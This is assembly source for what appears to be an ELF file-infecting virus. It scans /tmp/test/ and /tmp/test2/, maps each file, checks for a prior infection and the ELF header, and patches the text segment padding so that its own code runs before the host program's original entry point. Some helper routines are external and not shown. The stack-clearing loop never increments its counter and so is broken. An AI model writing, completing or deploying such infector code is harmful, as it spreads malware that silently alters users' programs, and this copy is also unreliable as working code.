				extern			sc_get_full_path
				extern			sc_map_file
sc:
				push			rbp
				mov				rbp,				rsp

				mov				rbx,				11 * 8 + 3 * 1024
				sub				rsp,				rbx
				mov				qword[sc_glob],		rsp

				push			rdi
				push			rsi
				push			rdx

				xor				rcx,				rcx
.loop:
				cmp				rcx,				rbx
				je				.loop_end

				mov				byte[rsp+rcx],		0
				jmp				.loop
.loop_end:
				lea				rdi,				[sc_dir_1]
				call			sc_proc_dir

				lea				rdi,				[sc_dir_2]
				call			sc_proc_dir

				pop				rdx
				pop				rsi
				pop				rdi

				mov				rsp,				rbp
				pop				rbp

				jmp				qword[rel sc_old_entry]
sc_proc_dir:
				push			rbp
				mov				rbp,				rsp

				sub				rsp,				8	; +8 dir_fd
				push			rdi						; +0 *dir

				mov				rsi,				0x10000
				mov				rax,				2
				syscall

				cmp				rax,				0
				jl				.end

				mov				qword[rsp+8],		rax
.loop:
				mov				rdi,				qword[rsp+8]
				mov				rsi,				qword[sc_glob]
				add				rsi,				0x860
				mov				rdx,				0x400
				mov				rax,				78
				syscall

				cmp				rax, 				0
				jle				.close_end

				mov				rdi,				rax
				mov				rsi,				qword[rsp]
				call			sc_proc_entries

				jmp				.loop
.close_end:
				mov				rdi,				qword[rsp+8]
				mov				rax,				3
				syscall
.end:
				mov				rsp,				rbp
				pop				rbp
				ret
sc_proc_entries:
				push			rbp
				mov				rbp,				rsp

				sub				rsp,				8		; +16 ent_ptr
				push			rdi							; +8 dir_ret
				push			rsi							; +0 root_path

				mov				qword[rsp+24],		0

				mov				rdx,				qword[sc_glob]
				add				rdx,				0x860
				mov				qword[rsp+16],		rdx
.loop:
				cmp				qword[rsp+8],		0	
				je				.end
				
				mov				rdi,				qword[rsp]
				mov				rsi,				qword[rsp+16]
				add				rsi,				18
				mov				rdx,				qword[sc_glob]
				add				rdx,				0x60
				call			sc_get_full_path

				mov				rdi,				qword[sc_glob]
				add				rdi,				0x60
				call			sc_map_file

				cmp				rax,				0
				jl				.inc

				mov				rbx,				qword[sc_glob]
				mov				rdx,				rbx
				add				rbx,				0x48
				add				rdx,				0xc60
				mov				rdx,				qword[rdx]
				mov				qword[rbx],			rdx

				call			sc_check_infection
				cmp				rax,				0
				jl				.unmap

				call			sc_test_elf_hdr
				cmp				rax,				0
				jl				.unmap

				call			sc_find_txt_seg
				cmp				rax,				0
				jl				.unmap

				call			sc_set_x_pad
				cmp				rax,				0
				jl				.unmap

				call			sc_update_mem
				cmp				rax,				0
				jl				.unmap

				mov				rdi,				qword[sc_glob]
				add				rdi,				0x60
				call			sc_write_mem
.unmap:
				mov				rdi,				qword[sc_glob]
				mov				rsi,				rdi
				add				rdi,				0xc60
				mov				rsi,				qword[rsi+0x18]
				mov				rax,				11
				syscall
.inc:
				mov				rdx,				qword[rsp+16]
				xor				rbx,				rbx
				mov				bx,					word[rdx+16]

				sub				qword[rsp+8],		bx
				add				qword[rsp+16],		bx
				jmp				.loop
.end:
				mov				rsp,				rbp
				pop				rbp
				ret
sc_end:

sc_data:
sc_dir_1:
				db				"/tmp/test/", 0
sc_dir_2:
				db				"/tmp/test2/", 0
sc_entry:
				dq				sc
sc_old_entry:
				dq				sc_end
sc_glob:
				dq				0	; +0x18 -> sz.mem
									; +0x20 -> sz.code
									; +0x28 -> sz.data
									; +0x30 -> sz.load
									; +0x38 -> sz.f_pad
									; +0x40 -> sz.m_pad

									; +0x48 -> *hdrs.elf
									; +0x50 -> *hdrs.txt
									; +0x58 -> *hdrs.nxt
									
									; +0x60 -> buffs.path
									; +0x460 -> buffs.zeros
									; +0x860 -> buffs.entry

									; +0xc60 -> mem
									; +0xc68 -> x_pad
sc_data_end:
